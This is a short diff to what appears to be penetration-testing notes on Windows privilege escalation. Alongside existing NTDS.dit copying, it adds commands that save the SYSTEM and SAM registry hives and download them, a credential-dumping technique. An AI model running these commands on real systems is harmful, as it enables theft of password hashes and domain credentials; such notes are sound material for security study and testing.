@@ -253,6 +253,11 @@ expose %cdrive% E:
 end backup
 # robocopy
 robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+reg save hklm\system C:\Users\h.grangon\Documents\system
+reg save hklm\sam C:\Users\h.grangon\Documents\sam
+download system
+download sam
 ```
 ## Event Log Readers
 ```bash
